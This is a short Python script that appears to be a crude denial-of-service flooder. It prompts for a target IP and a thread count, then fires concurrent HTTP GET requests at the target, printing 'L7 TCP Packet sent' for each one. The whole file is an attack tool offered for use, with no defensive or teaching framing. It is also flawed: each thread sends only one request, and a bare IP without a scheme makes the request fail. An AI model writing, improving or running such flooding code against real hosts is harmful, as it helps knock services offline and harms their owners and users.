import threading
import requests

ip = input("IP: ")
threads = int(input("Threads: "))


def l7_tcp():
    try:
        requests.get(ip)

        print("\033[32m[+]\033[0m L7 TCP Packet sent ->", ip)

    except Exception as err:
        print("\033[31m[-]\033[0m", err)


for i in range(threads):
    t = threading.Thread(target=l7_tcp)
    t.start()

input("")